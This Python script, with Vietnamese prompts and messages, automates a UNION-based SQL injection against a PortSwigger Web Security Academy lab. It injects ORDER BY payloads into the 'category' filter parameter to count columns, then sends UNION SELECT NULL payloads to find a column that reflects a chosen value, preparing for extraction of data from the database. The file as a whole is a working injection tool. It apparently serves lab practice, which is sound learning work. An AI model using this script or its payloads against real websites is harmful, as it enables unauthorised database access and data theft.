import requests

def find_column_count(url):
    print("[*] Đang xác định số cột bằng ORDER BY...")
    i = 1
    while True:
        payload = f"{url}/filter?category=Gifts'+ORDER+BY+{i}--"
        response = requests.get(payload)

        if response.status_code != 200:
            print(f"[+] Số cột hợp lệ: {i - 1}")
            return i - 1
        i += 1

def find_reflected_column(url, column_count, test_value):
    print("[*] Đang tìm cột phản hồi giá trị...")
    for pos in range(column_count):
        test_columns = ["NULL"] * column_count
        test_columns[pos] = f"'{test_value}'"
        payload = ",".join(test_columns)
        full_url = f"{url}/filter?category=Gifts'+UNION+SELECT+{payload}--"

        print(f"[*] Thử: cột {pos + 1} - {full_url}")
        response = requests.get(full_url)

        if test_value in response.text:
            print(f"[+] Giá trị được phản hồi ở cột: {pos + 1}")
            return pos + 1

    print("[-] Không tìm thấy cột phản hồi.")
    return None

if __name__ == "__main__":
    print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net")
    base_url = input("Nhập URL: ").rstrip("/")

    print("Ví dụ: Giá trị được lab cung cấp: aNjdF")
    test_value = input("Nhập giá trị test: ").strip()

    column_count = find_column_count(base_url)

    if column_count > 0:
        reflected_column = find_reflected_column(base_url, column_count, test_value)

        if reflected_column:
            print("[✓] Bạn có thể sử dụng cột này để extract dữ liệu từ database.")
        else:
            print("[-] Không có cột nào phản hồi được test value.")
